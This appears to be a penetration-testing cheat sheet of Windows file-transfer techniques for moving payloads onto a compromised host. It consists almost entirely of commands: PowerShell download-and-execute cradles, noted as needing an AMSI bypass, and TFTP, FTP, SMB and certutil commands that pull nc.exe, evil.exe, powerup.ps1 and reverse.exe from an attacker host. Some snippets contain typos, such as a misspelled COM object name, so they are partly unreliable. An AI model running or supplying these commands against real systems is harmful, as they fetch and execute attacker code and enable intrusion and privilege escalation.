# Windows File Transfer

### Powershell Download Execute cradle <a href="#powershell-download-execute-cradle" id="powershell-download-execute-cradle"></a>

**Note: AMSI needs to be bypassed**

```
iex (New-Object Net.Webclient).DownloadString('http://webserver/payload.ps1')
```

```
$ie=New-object -ComObject internetExplorer.Application
$ie.visible=$false
$ie.navigate('http://webserver/payload.ps1')
sleep 5
$response=$ie.Document.body.innerHTML
$ie.quit()
iex
```

**Using Powershellv3**

```
iex (iwr 'http://webserver/payload.ps1')
```

```
$h=New-Object -Comobject Msxm1l2.XMLHTTP
$h.open('GET','http://webserver/payload.ps1',$false)
$h.send();iex
$h.responseText
```

```
$wr = [System.NET.WebRequest]::Create("http://webserver/payload.ps1")
$r= $wr.GetResponse()
IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

#### TFTP Server <a href="#tftp-server" id="tftp-server"></a>

```
TFTP
# Windows XP and Win 2003 contain tftp client. Windows 7 do not by default 
# tfpt clients are usually non-interactive, so they could work through an obtained shell 

atftpd --daemon --port 69 /tftp
Windows> tftp -i 192.168.30.45 GET nc.exe
```

#### Python pyftpdlib <a href="#python-pyftpdlib" id="python-pyftpdlib"></a>

```
FTP (pyftpdlib client on Kali)
# Ftp is generally installed on Windows machines
# To make it interactive, use -s option

# On Kali install a ftp client and set a username/password
apt-get install python-pyftpdlib  
python -m pyftpdlib -p 21

# on Windows
ftp <attackerip>
> binary
> get exploit.exe
```

#### FTP server pureftpd <a href="#ftp-server-pureftpd" id="ftp-server-pureftpd"></a>

```
# on Kali

# install ftp client
apt-get install pure-ftpd

# create a group
groupadd ftpgroup

# add a user
useradd -g ftpgroup -d /dev/null -s /etc ftpuser

# Create a directory for your ftp-files (you can also specify a specific user e.g.: /root/ftphome/bob).
mkdir /root/ftphome

# Create a ftp-user, in our example "bob" (again you can set "-d /root/ftphome/bob/" if you wish).
pure-pw useradd bob -u ftpuser -g ftpgroup -d /root/ftphome/

# Update the ftp database after adding our new user.
pure-pw mkdb

# change ownership of the specified ftp directory (and all it's sub-direcotries) 
chown -R ftpuser:ftpgroup /root/ftphome

# restart Pure-FTPD
/etc/init.d/pure-ftpd restart


# On Windows
echo open <attackerip> 21> ftp.txt
echo USER username password >> ftp.txt
echo bin >> ftp.txt
echo GET evil.exe >> ftp.txt
echo bye >> ftp.txt
ftp -s:ftp.txt
```

```
Powershell full path: 
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe 
C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe
```

#### Powershell OneLiners <a href="#powershell-oneliners" id="powershell-oneliners"></a>

```
iex(iwr http://example.com/text.ps1 -UseBasicParsing)

powershell.exe (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")

powershell.exe "IEX(New-Object Net.WebClient).downloadString('http:///<script>')"
```

#### Powershell Script <a href="#powershell-script" id="powershell-script"></a>

```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://<attackerip>/powerup.ps1" >>wget.ps1
echo $file = "powerup.ps1" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

#### SMB Server <a href="#smb-server" id="smb-server"></a>

```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe
```

#### CertUtil <a href="#certutil" id="certutil"></a>

```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
```
